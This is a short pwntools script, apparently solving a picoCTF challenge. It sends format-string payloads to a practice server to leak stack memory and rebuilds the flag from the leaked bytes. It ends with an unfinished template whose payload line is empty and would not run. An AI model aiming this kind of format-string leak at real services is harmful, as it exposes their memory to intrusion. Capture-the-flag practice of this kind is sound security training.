from pwn import *
#exe = ELF('link_elf')
#context(binary=exe)
#r = exe.process()
#gdb.attach(r)
#raw_input(1)
flag = ''
for i in range(15,30):
	r = remote('mercury.picoctf.net',16439)
	payload = b'%'+ (b'%d$x' % i)
	print(payload)
	r.sendline(b'1')
	r.sendline(payload)
	r.recvuntil('Buying stonks with token:')
	r.recvline()
	flag += bytearray.fromhex(r.recvline().split(b'\n')[0].decode('ascii','ignore')).decode()[::-1]
	print(flag)
	r.close()
from pwn import *
#exe = ELF('link_elf')
#context(binary=exe)
#r = exe.process()
#gdb.attach(r)
#raw_input(1)
r = remote('link',port)
payload = 
print(payload)
r.sendline(payload)
r.interactive()
